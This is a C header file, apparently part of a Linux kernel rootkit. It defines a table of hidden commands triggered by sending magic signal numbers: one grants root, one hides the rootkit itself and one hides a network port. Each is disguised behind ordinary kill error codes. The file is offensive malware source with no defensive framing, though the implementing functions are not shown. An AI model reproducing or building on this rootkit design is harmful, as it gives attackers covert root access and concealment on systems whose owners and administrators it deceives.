#pragma once

#include "../include/core.h"
#include "./get_root.h"
#include "./hide.h"
#include "./hide_port.h"

void helpMenu(void);

#define MAGIC_SIG 67

#define GET_ROOT 0x726f6f74
#define SELFHIDE 0x68696465
#define HIDEPORT -1
#define GET_HELP 0x68656c70

#define PIDTABLE                                                               \
    X(GET_ROOT, MAGIC_SIG, getRoot(), "Get Root", -ESRCH)                      \
    X(SELFHIDE, MAGIC_SIG, toggleRkView(), "Toggle hide", -ESRCH)              \
    X(HIDEPORT, 69, toggleHidePort(pid), "Toggle hide port", -ESRCH)           \
    X(GET_HELP, MAGIC_SIG, helpMenu(), "Help Menu", -EACCES)

int menu(long sig, long pid);
